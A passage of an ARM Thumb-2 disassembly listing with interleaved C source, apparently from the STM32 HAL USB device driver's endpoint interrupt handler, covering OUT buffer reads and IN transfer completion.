 8002818:	697b      	ldr	r3, [r7, #20]
 800281a:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 800281c:	687b      	ldr	r3, [r7, #4]
 800281e:	681b      	ldr	r3, [r3, #0]
 8002820:	881b      	ldrh	r3, [r3, #0]
 8002822:	b29b      	uxth	r3, r3
 8002824:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002828:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800282c:	827b      	strh	r3, [r7, #18]
 800282e:	8a7b      	ldrh	r3, [r7, #18]
 8002830:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8002834:	827b      	strh	r3, [r7, #18]
 8002836:	8a7b      	ldrh	r3, [r7, #18]
 8002838:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800283c:	827b      	strh	r3, [r7, #18]
 800283e:	687b      	ldr	r3, [r7, #4]
 8002840:	681a      	ldr	r2, [r3, #0]
 8002842:	8a7b      	ldrh	r3, [r7, #18]
 8002844:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002848:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800284c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002850:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002854:	b29b      	uxth	r3, r3
 8002856:	8013      	strh	r3, [r2, #0]
 8002858:	e22c      	b.n	8002cb4 <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 800285a:	687b      	ldr	r3, [r7, #4]
 800285c:	681b      	ldr	r3, [r3, #0]
 800285e:	461a      	mov	r2, r3
 8002860:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002864:	009b      	lsls	r3, r3, #2
 8002866:	4413      	add	r3, r2
 8002868:	881b      	ldrh	r3, [r3, #0]
 800286a:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 800286e:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 8002872:	2b00      	cmp	r3, #0
 8002874:	f280 80f6 	bge.w	8002a64 <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 8002878:	687b      	ldr	r3, [r7, #4]
 800287a:	681b      	ldr	r3, [r3, #0]
 800287c:	461a      	mov	r2, r3
 800287e:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002882:	009b      	lsls	r3, r3, #2
 8002884:	4413      	add	r3, r2
 8002886:	881b      	ldrh	r3, [r3, #0]
 8002888:	b29a      	uxth	r2, r3
 800288a:	f640 738f 	movw	r3, #3983	; 0xf8f
 800288e:	4013      	ands	r3, r2
 8002890:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8002894:	687b      	ldr	r3, [r7, #4]
 8002896:	681b      	ldr	r3, [r3, #0]
 8002898:	461a      	mov	r2, r3
 800289a:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 800289e:	009b      	lsls	r3, r3, #2
 80028a0:	4413      	add	r3, r2
 80028a2:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 80028a6:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80028aa:	b292      	uxth	r2, r2
 80028ac:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 80028ae:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 80028b2:	4613      	mov	r3, r2
 80028b4:	009b      	lsls	r3, r3, #2
 80028b6:	4413      	add	r3, r2
 80028b8:	00db      	lsls	r3, r3, #3
 80028ba:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80028be:	687a      	ldr	r2, [r7, #4]
 80028c0:	4413      	add	r3, r2
 80028c2:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 80028c4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028c6:	7b1b      	ldrb	r3, [r3, #12]
 80028c8:	2b00      	cmp	r3, #0
 80028ca:	d123      	bne.n	8002914 <PCD_EP_ISR_Handler+0x3ce>
        {
          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80028cc:	687b      	ldr	r3, [r7, #4]
 80028ce:	681b      	ldr	r3, [r3, #0]
 80028d0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80028d4:	b29b      	uxth	r3, r3
 80028d6:	461a      	mov	r2, r3
 80028d8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028da:	781b      	ldrb	r3, [r3, #0]
 80028dc:	00db      	lsls	r3, r3, #3
 80028de:	4413      	add	r3, r2
 80028e0:	687a      	ldr	r2, [r7, #4]
 80028e2:	6812      	ldr	r2, [r2, #0]
 80028e4:	4413      	add	r3, r2
 80028e6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80028ea:	881b      	ldrh	r3, [r3, #0]
 80028ec:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80028f0:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 80028f4:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80028f8:	2b00      	cmp	r3, #0
 80028fa:	f000 808e 	beq.w	8002a1a <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 80028fe:	687b      	ldr	r3, [r7, #4]
 8002900:	6818      	ldr	r0, [r3, #0]
 8002902:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002904:	6959      	ldr	r1, [r3, #20]
 8002906:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002908:	88da      	ldrh	r2, [r3, #6]
 800290a:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 800290e:	f005 fdda 	bl	80084c6 <USB_ReadPMA>
 8002912:	e082      	b.n	8002a1a <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 8002914:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002916:	78db      	ldrb	r3, [r3, #3]
 8002918:	2b02      	cmp	r3, #2
 800291a:	d10a      	bne.n	8002932 <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 800291c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002920:	461a      	mov	r2, r3
 8002922:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002924:	6878      	ldr	r0, [r7, #4]
 8002926:	f000 f9d3 	bl	8002cd0 <HAL_PCD_EP_DB_Receive>
 800292a:	4603      	mov	r3, r0
 800292c:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 8002930:	e073      	b.n	8002a1a <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002932:	687b      	ldr	r3, [r7, #4]
 8002934:	681b      	ldr	r3, [r3, #0]
 8002936:	461a      	mov	r2, r3
 8002938:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800293a:	781b      	ldrb	r3, [r3, #0]
 800293c:	009b      	lsls	r3, r3, #2
 800293e:	4413      	add	r3, r2
 8002940:	881b      	ldrh	r3, [r3, #0]
 8002942:	b29b      	uxth	r3, r3
 8002944:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002948:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800294c:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 8002950:	687b      	ldr	r3, [r7, #4]
 8002952:	681b      	ldr	r3, [r3, #0]
 8002954:	461a      	mov	r2, r3
 8002956:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002958:	781b      	ldrb	r3, [r3, #0]
 800295a:	009b      	lsls	r3, r3, #2
 800295c:	441a      	add	r2, r3
 800295e:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 8002962:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002966:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800296a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800296e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002972:	b29b      	uxth	r3, r3
 8002974:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 8002976:	687b      	ldr	r3, [r7, #4]
 8002978:	681b      	ldr	r3, [r3, #0]
 800297a:	461a      	mov	r2, r3
 800297c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800297e:	781b      	ldrb	r3, [r3, #0]
 8002980:	009b      	lsls	r3, r3, #2
 8002982:	4413      	add	r3, r2
 8002984:	881b      	ldrh	r3, [r3, #0]
 8002986:	b29b      	uxth	r3, r3
 8002988:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800298c:	2b00      	cmp	r3, #0
 800298e:	d022      	beq.n	80029d6 <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002990:	687b      	ldr	r3, [r7, #4]
 8002992:	681b      	ldr	r3, [r3, #0]
 8002994:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002998:	b29b      	uxth	r3, r3
 800299a:	461a      	mov	r2, r3
 800299c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800299e:	781b      	ldrb	r3, [r3, #0]
 80029a0:	00db      	lsls	r3, r3, #3
 80029a2:	4413      	add	r3, r2
 80029a4:	687a      	ldr	r2, [r7, #4]
 80029a6:	6812      	ldr	r2, [r2, #0]
 80029a8:	4413      	add	r3, r2
 80029aa:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80029ae:	881b      	ldrh	r3, [r3, #0]
 80029b0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80029b4:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 80029b8:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029bc:	2b00      	cmp	r3, #0
 80029be:	d02c      	beq.n	8002a1a <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 80029c0:	687b      	ldr	r3, [r7, #4]
 80029c2:	6818      	ldr	r0, [r3, #0]
 80029c4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029c6:	6959      	ldr	r1, [r3, #20]
 80029c8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029ca:	891a      	ldrh	r2, [r3, #8]
 80029cc:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029d0:	f005 fd79 	bl	80084c6 <USB_ReadPMA>
 80029d4:	e021      	b.n	8002a1a <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 80029d6:	687b      	ldr	r3, [r7, #4]
 80029d8:	681b      	ldr	r3, [r3, #0]
 80029da:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80029de:	b29b      	uxth	r3, r3
 80029e0:	461a      	mov	r2, r3
 80029e2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029e4:	781b      	ldrb	r3, [r3, #0]
 80029e6:	00db      	lsls	r3, r3, #3
 80029e8:	4413      	add	r3, r2
 80029ea:	687a      	ldr	r2, [r7, #4]
 80029ec:	6812      	ldr	r2, [r2, #0]
 80029ee:	4413      	add	r3, r2
 80029f0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80029f4:	881b      	ldrh	r3, [r3, #0]
 80029f6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80029fa:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 80029fe:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a02:	2b00      	cmp	r3, #0
 8002a04:	d009      	beq.n	8002a1a <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002a06:	687b      	ldr	r3, [r7, #4]
 8002a08:	6818      	ldr	r0, [r3, #0]
 8002a0a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a0c:	6959      	ldr	r1, [r3, #20]
 8002a0e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a10:	895a      	ldrh	r2, [r3, #10]
 8002a12:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a16:	f005 fd56 	bl	80084c6 <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 8002a1a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a1c:	69da      	ldr	r2, [r3, #28]
 8002a1e:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a22:	441a      	add	r2, r3
 8002a24:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a26:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 8002a28:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a2a:	695a      	ldr	r2, [r3, #20]
 8002a2c:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a30:	441a      	add	r2, r3
 8002a32:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a34:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002a36:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a38:	699b      	ldr	r3, [r3, #24]
 8002a3a:	2b00      	cmp	r3, #0
 8002a3c:	d005      	beq.n	8002a4a <PCD_EP_ISR_Handler+0x504>
 8002a3e:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002a42:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a44:	691b      	ldr	r3, [r3, #16]
 8002a46:	429a      	cmp	r2, r3
 8002a48:	d206      	bcs.n	8002a58 <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 8002a4a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a4c:	781b      	ldrb	r3, [r3, #0]
 8002a4e:	4619      	mov	r1, r3
 8002a50:	6878      	ldr	r0, [r7, #4]
 8002a52:	f009 ff3d 	bl	800c8d0 <HAL_PCD_DataOutStageCallback>
 8002a56:	e005      	b.n	8002a64 <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002a58:	687b      	ldr	r3, [r7, #4]
 8002a5a:	681b      	ldr	r3, [r3, #0]
 8002a5c:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002a5e:	4618      	mov	r0, r3
 8002a60:	f003 ffe3 	bl	8006a2a <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 8002a64:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002a68:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002a6c:	2b00      	cmp	r3, #0
 8002a6e:	f000 8121 	beq.w	8002cb4 <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 8002a72:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a76:	1c5a      	adds	r2, r3, #1
 8002a78:	4613      	mov	r3, r2
 8002a7a:	009b      	lsls	r3, r3, #2
 8002a7c:	4413      	add	r3, r2
 8002a7e:	00db      	lsls	r3, r3, #3
 8002a80:	687a      	ldr	r2, [r7, #4]
 8002a82:	4413      	add	r3, r2
 8002a84:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 8002a86:	687b      	ldr	r3, [r7, #4]
 8002a88:	681b      	ldr	r3, [r3, #0]
 8002a8a:	461a      	mov	r2, r3
 8002a8c:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a90:	009b      	lsls	r3, r3, #2
 8002a92:	4413      	add	r3, r2
 8002a94:	881b      	ldrh	r3, [r3, #0]
 8002a96:	b29b      	uxth	r3, r3
 8002a98:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002a9c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002aa0:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8002aa4:	687b      	ldr	r3, [r7, #4]
 8002aa6:	681b      	ldr	r3, [r3, #0]
 8002aa8:	461a      	mov	r2, r3
 8002aaa:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002aae:	009b      	lsls	r3, r3, #2
 8002ab0:	441a      	add	r2, r3
 8002ab2:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002ab6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002aba:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002abe:	b29b      	uxth	r3, r3
 8002ac0:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002ac2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ac4:	78db      	ldrb	r3, [r3, #3]
 8002ac6:	2b01      	cmp	r3, #1
 8002ac8:	f040 80a2 	bne.w	8002c10 <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002acc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ace:	2200      	movs	r2, #0
 8002ad0:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002ad2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ad4:	7b1b      	ldrb	r3, [r3, #12]
 8002ad6:	2b00      	cmp	r3, #0
 8002ad8:	f000 8093 	beq.w	8002c02 <PCD_EP_ISR_Handler+0x6bc>
          {
            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002adc:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002ae0:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002ae4:	2b00      	cmp	r3, #0
 8002ae6:	d046      	beq.n	8002b76 <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002ae8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aea:	785b      	ldrb	r3, [r3, #1]
 8002aec:	2b00      	cmp	r3, #0
 8002aee:	d126      	bne.n	8002b3e <PCD_EP_ISR_Handler+0x5f8>
 8002af0:	687b      	ldr	r3, [r7, #4]
 8002af2:	681b      	ldr	r3, [r3, #0]
 8002af4:	627b      	str	r3, [r7, #36]	; 0x24
 8002af6:	687b      	ldr	r3, [r7, #4]
 8002af8:	681b      	ldr	r3, [r3, #0]
 8002afa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002afe:	b29b      	uxth	r3, r3
 8002b00:	461a      	mov	r2, r3
 8002b02:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002b04:	4413      	add	r3, r2
 8002b06:	627b      	str	r3, [r7, #36]	; 0x24
 8002b08:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b0a:	781b      	ldrb	r3, [r3, #0]
 8002b0c:	00da      	lsls	r2, r3, #3
 8002b0e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002b10:	4413      	add	r3, r2
 8002b12:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b16:	623b      	str	r3, [r7, #32]
 8002b18:	6a3b      	ldr	r3, [r7, #32]
 8002b1a:	881b      	ldrh	r3, [r3, #0]
 8002b1c:	b29b      	uxth	r3, r3
 8002b1e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b22:	b29a      	uxth	r2, r3
 8002b24:	6a3b      	ldr	r3, [r7, #32]
 8002b26:	801a      	strh	r2, [r3, #0]
 8002b28:	6a3b      	ldr	r3, [r7, #32]
 8002b2a:	881b      	ldrh	r3, [r3, #0]
 8002b2c:	b29b      	uxth	r3, r3
 8002b2e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002b32:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002b36:	b29a      	uxth	r2, r3
 8002b38:	6a3b      	ldr	r3, [r7, #32]
 8002b3a:	801a      	strh	r2, [r3, #0]
 8002b3c:	e061      	b.n	8002c02 <PCD_EP_ISR_Handler+0x6bc>
 8002b3e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b40:	785b      	ldrb	r3, [r3, #1]
 8002b42:	2b01      	cmp	r3, #1
 8002b44:	d15d      	bne.n	8002c02 <PCD_EP_ISR_Handler+0x6bc>
 8002b46:	687b      	ldr	r3, [r7, #4]
 8002b48:	681b      	ldr	r3, [r3, #0]
 8002b4a:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002b4c:	687b      	ldr	r3, [r7, #4]
 8002b4e:	681b      	ldr	r3, [r3, #0]
 8002b50:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b54:	b29b      	uxth	r3, r3
 8002b56:	461a      	mov	r2, r3
 8002b58:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002b5a:	4413      	add	r3, r2
 8002b5c:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002b5e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b60:	781b      	ldrb	r3, [r3, #0]
 8002b62:	00da      	lsls	r2, r3, #3
 8002b64:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002b66:	4413      	add	r3, r2
 8002b68:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b6c:	62bb      	str	r3, [r7, #40]	; 0x28
 8002b6e:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002b70:	2200      	movs	r2, #0
 8002b72:	801a      	strh	r2, [r3, #0]
 8002b74:	e045      	b.n	8002c02 <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002b76:	687b      	ldr	r3, [r7, #4]
 8002b78:	681b      	ldr	r3, [r3, #0]
 8002b7a:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002b7c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b7e:	785b      	ldrb	r3, [r3, #1]
 8002b80:	2b00      	cmp	r3, #0
 8002b82:	d126      	bne.n	8002bd2 <PCD_EP_ISR_Handler+0x68c>
 8002b84:	687b      	ldr	r3, [r7, #4]
 8002b86:	681b      	ldr	r3, [r3, #0]
 8002b88:	637b      	str	r3, [r7, #52]	; 0x34
 8002b8a:	687b      	ldr	r3, [r7, #4]
 8002b8c:	681b      	ldr	r3, [r3, #0]
 8002b8e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b92:	b29b      	uxth	r3, r3
 8002b94:	461a      	mov	r2, r3
 8002b96:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002b98:	4413      	add	r3, r2
 8002b9a:	637b      	str	r3, [r7, #52]	; 0x34
 8002b9c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b9e:	781b      	ldrb	r3, [r3, #0]
 8002ba0:	00da      	lsls	r2, r3, #3
 8002ba2:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002ba4:	4413      	add	r3, r2
 8002ba6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002baa:	633b      	str	r3, [r7, #48]	; 0x30
 8002bac:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002bae:	881b      	ldrh	r3, [r3, #0]
 8002bb0:	b29b      	uxth	r3, r3
 8002bb2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002bb6:	b29a      	uxth	r2, r3
 8002bb8:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002bba:	801a      	strh	r2, [r3, #0]
 8002bbc:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002bbe:	881b      	ldrh	r3, [r3, #0]
 8002bc0:	b29b      	uxth	r3, r3
 8002bc2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002bc6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002bca:	b29a      	uxth	r2, r3
 8002bcc:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002bce:	801a      	strh	r2, [r3, #0]
 8002bd0:	e017      	b.n	8002c02 <PCD_EP_ISR_Handler+0x6bc>
 8002bd2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bd4:	785b      	ldrb	r3, [r3, #1]
 8002bd6:	2b01      	cmp	r3, #1
 8002bd8:	d113      	bne.n	8002c02 <PCD_EP_ISR_Handler+0x6bc>
 8002bda:	687b      	ldr	r3, [r7, #4]
 8002bdc:	681b      	ldr	r3, [r3, #0]
 8002bde:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002be2:	b29b      	uxth	r3, r3
 8002be4:	461a      	mov	r2, r3
 8002be6:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002be8:	4413      	add	r3, r2
 8002bea:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002bec:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bee:	781b      	ldrb	r3, [r3, #0]
 8002bf0:	00da      	lsls	r2, r3, #3
 8002bf2:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002bf4:	4413      	add	r3, r2
 8002bf6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002bfa:	63bb      	str	r3, [r7, #56]	; 0x38
 8002bfc:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002bfe:	2200      	movs	r2, #0
 8002c00:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002c02:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c04:	781b      	ldrb	r3, [r3, #0]
 8002c06:	4619      	mov	r1, r3
 8002c08:	6878      	ldr	r0, [r7, #4]
 8002c0a:	f009 fe7c 	bl	800c906 <HAL_PCD_DataInStageCallback>
 8002c0e:	e051      	b.n	8002cb4 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002c10:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002c14:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002c18:	2b00      	cmp	r3, #0
 8002c1a:	d144      	bne.n	8002ca6 <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002c1c:	687b      	ldr	r3, [r7, #4]
 8002c1e:	681b      	ldr	r3, [r3, #0]
 8002c20:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c24:	b29b      	uxth	r3, r3
 8002c26:	461a      	mov	r2, r3
 8002c28:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c2a:	781b      	ldrb	r3, [r3, #0]
 8002c2c:	00db      	lsls	r3, r3, #3
 8002c2e:	4413      	add	r3, r2
 8002c30:	687a      	ldr	r2, [r7, #4]
 8002c32:	6812      	ldr	r2, [r2, #0]
 8002c34:	4413      	add	r3, r2
 8002c36:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002c3a:	881b      	ldrh	r3, [r3, #0]
 8002c3c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c40:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002c44:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c46:	699a      	ldr	r2, [r3, #24]
 8002c48:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c4c:	429a      	cmp	r2, r3
 8002c4e:	d907      	bls.n	8002c60 <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002c50:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c52:	699a      	ldr	r2, [r3, #24]
 8002c54:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c58:	1ad2      	subs	r2, r2, r3
 8002c5a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c5c:	619a      	str	r2, [r3, #24]
 8002c5e:	e002      	b.n	8002c66 <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
